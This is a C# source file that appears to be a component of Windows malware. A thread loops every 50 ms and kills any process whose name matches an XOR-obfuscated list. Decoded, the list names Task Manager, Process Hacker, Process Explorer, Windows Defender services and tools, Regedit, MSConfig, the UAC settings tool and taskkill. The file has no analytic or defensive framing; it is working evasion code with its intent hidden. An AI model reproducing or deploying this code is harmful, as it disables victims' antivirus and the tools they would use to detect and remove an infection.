using System;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Text;
using System.Threading;

namespace Peg.ICARUS
{
    public static class ProstathsYlhs
    {
        private static Thread BlockThread = new Thread(Block);
        public static bool Enabled { get; set; }


        public static void Arxiko()
        {
            Enabled = true;
            BlockThread.Start();
        }


        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        public static void StopBlock()
        {
            Enabled = false;
            try
            {
                BlockThread.Abort();
                BlockThread = new Thread(Block);
            }
            catch
            {
            }
        }

        public static string thebook(string str)
        {
            var ch1 = '\n';
            var stringBuilder = new StringBuilder();

            foreach (uint num in str.ToCharArray())
            {
                var ch2 = (char)(num ^ ch1);
                stringBuilder.Append(ch2);
            }

            return stringBuilder.ToString();
        }

        private static void Block()
        {
            while (Enabled)
            {
                var snapshot = CreateToolhelp32Snapshot(0x00000002u, 0u);
                var entry = new PROCESSENTRY32();
                entry.dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32));
                if (Process32First(snapshot, ref entry))
                    do
                    {
                        var id = entry.th32ProcessID;
                        var name = entry.szExeFile;

                        if (Matches(name, thebook("^kyagmx$oro")) ||
                            Matches(name, thebook("ZxeioyyBkiaox$oro")) ||
                            Matches(name, thebook("zxeiorz$oro")) ||
                            Matches(name, thebook("GYKYIc$oro")) ||
                            Matches(name, thebook("GyGzOdm$oro")) ||
                            Matches(name, thebook("Gz_RYx|$oro")) ||
                            Matches(name, thebook("GzIgnXd$oro")) ||
                            Matches(name, thebook("DcyYx|$oro")) ||
                            Matches(name, thebook("IedlcmYoixc~sZefcis$oro")) ||
                            Matches(name, thebook("GYIedlcm$oro")) ||
                            Matches(name, thebook("Xomonc~$oro")) ||
                            Matches(name, thebook("_yoxKiied~Ied~xefYo~~cdmy$oro")) ||
                            Matches(name, thebook("~kyaacff$oro")))
                            KillProcess(id);
                    } while (Process32Next(snapshot, ref entry));

                CloseHandle(snapshot);
                Thread.Sleep(50);
            }
        }


        private static bool Matches(string source, string target)
        {
            return source.EndsWith(target, StringComparison.InvariantCultureIgnoreCase);
        }


        private static void KillProcess(uint processId)
        {
            var process = OpenProcess(0x0001u, false, processId);
            TerminateProcess(process, 0);
            CloseHandle(process);
        }

        #region DLL Imports

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

        [DllImport("kernel32.dll")]
        private static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

        [DllImport("kernel32.dll")]
        private static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

        [DllImport("kernel32.dll")]
        private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("kernel32.dll")]
        private static extern bool CloseHandle(IntPtr handle);

        [DllImport("kernel32.dll")]
        private static extern bool TerminateProcess(IntPtr dwProcessHandle, int exitCode);

        #endregion
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESSENTRY32
    {
        public uint dwSize;
        public uint cntUsage;
        public uint th32ProcessID;
        public IntPtr th32DefaultHeapID;
        public uint th32ModuleID;
        public uint cntThreads;
        public uint th32ParentProcessID;
        public int pcPriClassBase;
        public uint dwFlags;

        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
        public string szExeFile;
    }
}